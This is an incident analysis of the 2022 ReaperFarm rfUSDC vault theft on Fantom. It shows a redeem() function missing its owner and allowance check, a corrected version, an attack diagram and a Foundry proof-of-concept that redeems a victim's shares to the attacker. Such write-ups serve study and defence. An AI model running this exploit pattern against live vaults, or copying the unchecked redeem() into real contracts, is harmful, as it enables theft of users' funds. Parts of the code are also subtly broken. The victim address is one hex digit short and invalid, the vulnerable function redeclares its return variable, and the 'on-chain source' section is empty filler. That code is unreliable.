# ReaperFarm — ERC4626 redeem() Owner Validation Missing Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08-13 |
| **Protocol** | ReaperFarm (Yield Vault) |
| **Chain** | Fantom |
| **Loss** | ~$1,700,000 |
| **Attacker 1** | [0x5636e55e4a72299a0f194c001841e2ce75bb527a](https://ftmscan.com/address/0x5636e55e4a72299a0f194c001841e2ce75bb527a) |
| **Attacker 2** | [0x2c177d20b1b1d68cc85d3215904a7bb6629ca954](https://ftmscan.com/address/0x2c177d20b1b1d68cc85d3215904a7bb6629ca954) |
| **Attack Contract** | [0x8162a5e187128565ace634e76fdd083cb04d0145](https://ftmscan.com/address/0x8162a5e187128565ace634e76fdd083cb04d0145) |
| **Vulnerable Contract (rfUSDC Vault)** | [0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D](https://ftmscan.com/address/0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D) |
| **Root Cause** | `redeem(shares, receiver, owner)` function allows withdrawal of another user's shares without validating the `owner` parameter |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/ReaperFarm_exp.sol) |

---
## 1. Vulnerability Overview

ReaperFarm is a yield vault protocol on the Fantom chain that implements the ERC4626 tokenized vault standard. The ERC4626 `redeem(uint256 shares, address receiver, address owner)` function burns `owner`'s shares and transfers the underlying assets to `receiver`. In a standard-compliant implementation, when `msg.sender != owner`, the `allowance` must be checked beforehand — however, ReaperFarm's implementation omitted this check. The attacker set the victim's address as `owner` and their own address as `receiver`, allowing unauthorized withdrawal of all of the victim's vault shares.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable redeem() — no owner validation
function redeem(
    uint256 shares,
    address receiver,
    address owner    // ❌ any address can be specified
) public override returns (uint256 assets) {
    // ❌ does not check whether msg.sender is owner, or whether allowance exists
    // ERC4626 standard: if msg.sender != owner, allowance must be decremented

    uint256 assets = convertToAssets(shares);

    // burn shares from owner
    _burn(owner, shares);  // ❌ burned without owner's consent

    // transfer assets to receiver
    IERC20(asset()).safeTransfer(receiver, assets);

    emit Withdraw(msg.sender, receiver, owner, assets, shares);
    return assets;
}

// ✅ Correct ERC4626 standard implementation
function redeem(
    uint256 shares,
    address receiver,
    address owner
) public override returns (uint256 assets) {
    // ✅ if msg.sender is not owner, check and decrement allowance
    if (msg.sender != owner) {
        uint256 allowed = allowance(owner, msg.sender);
        if (allowed != type(uint256).max) {
            require(allowed >= shares, "ERC4626: redeem exceeds allowance");
            _approve(owner, msg.sender, allowed - shares);
        }
    }

    uint256 assets = convertToAssets(shares);
    _burn(owner, shares);
    IERC20(asset()).safeTransfer(receiver, assets);

    emit Withdraw(msg.sender, receiver, owner, assets, shares);
    return assets;
}
```


### On-Chain Original Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable Function** — `redeem()`:
```solidity
// ❌ Root cause: `redeem(shares, receiver, owner)` function allows withdrawal of another user's shares without validating the `owner` parameter
// Source code unconfirmed — bytecode analysis required
// Vulnerability: `redeem(shares, receiver, owner)` function allows withdrawal of another user's shares without validating the `owner` parameter
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x5636...)
    │
    ├─[1] Query victim's rfUSDC vault share balance
    │       victim_bal = rfUSDC.balanceOf(victim)
    │
    ├─[2] Directly call redeem(victim_bal, attacker, victim)
    │       │
    │       ├─ shares: victim's total shares
    │       ├─ receiver: attacker address  ← receives assets
    │       └─ owner: victim address       ← ❌ no validation
    │
    ├─[3] Execute _burn(victim, victim_bal)
    │       └─ victim's shares burned
    │
    └─[4] Transfer USDC to attacker
              Victim loss: all USDC in vault
              (total ~$1.7M)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IReaperVaultV2 {
    function balanceOf(address owner) external view returns (uint256);
    // ❌ vulnerable redeem() with no owner validation
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract ReaperFarmExploit is Test {
    IReaperVaultV2 rfUSDC = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
    IERC20 USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75); // Fantom USDC

    // victim address (vault share holder)
    address victim = 0x1B14cfe5Fcf82cf5C4b8B52B41bF9a7B2EfC0aA;

    function setUp() public {
        vm.createSelectFork("fantom", 44_045_899);
    }

    function testExploit() public {
        address attacker = address(this);

        emit log_named_decimal_uint(
            "[Start] Victim rfUSDC shares",
            rfUSDC.balanceOf(victim),
            6
        );
        emit log_named_decimal_uint(
            "[Start] Attacker USDC balance",
            USDC.balanceOf(attacker),
            6
        );

        // Query victim's total vault share amount
        uint256 victimShares = rfUSDC.balanceOf(victim);

        // ⚡ Core attack: owner = victim, receiver = attacker
        // Since redeem() omits the msg.sender != owner check,
        // the attacker can withdraw the victim's shares to themselves without authorization
        rfUSDC.redeem(
            victimShares,   // victim's total shares
            attacker,       // ← asset recipient: attacker
            victim          // ← share owner: victim (no validation)
        );

        emit log_named_decimal_uint(
            "[End] Victim rfUSDC shares",
            rfUSDC.balanceOf(victim),
            6
        );
        emit log_named_decimal_uint(
            "[End] Attacker USDC balance",
            USDC.balanceOf(attacker),
            6
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC4626 redeem() owner validation missing |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Tokenized vault access control flaw |
| **Attack Vector** | Direct call to `redeem(shares, attacker, victim)` |
| **Preconditions** | ERC4626 `redeem()` allowance validation omitted |
| **Impact** | ~$1,700,000 loss |

---
## 6. Remediation Recommendations

1. **ERC4626 Standard Compliance**: In `redeem()`, when `msg.sender != owner`, always check and decrement the allowance. Use OpenZeppelin's ERC4626 implementation as the base.
2. **Include third-party redeem scenarios in unit tests**: Test behavior when `owner` and `msg.sender` differ to verify that allowance logic operates correctly.
3. **Use standard libraries**: Inherit standardized token interfaces (ERC20, ERC4626) from audited libraries (OpenZeppelin) rather than implementing them from scratch.

```solidity
// ✅ Safe implementation based on OpenZeppelin ERC4626
import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract ReaperVaultV2 is ERC4626 {
    // OpenZeppelin ERC4626 automatically handles allowance within redeem()
    // No separate implementation required
}
```

---
## 7. Lessons Learned

- **Subtle differences in ERC standard implementations**: ERC4626 is a relatively new standard finalized in 2022, and at the time many protocols implemented it independently without fully understanding the specification. Numerous implementations were found to have overlooked the standard's security requirements — particularly those related to delegation.
- **Importance of using audited libraries**: OpenZeppelin's ERC4626 implementation does not contain this vulnerability. Inheriting from audited libraries prevents mistakes like this.
- **Fantom ecosystem**: This incident occurred in a major yield vault protocol on Fantom, and the $1.7M loss dealt a significant blow to the Fantom DeFi ecosystem at the time.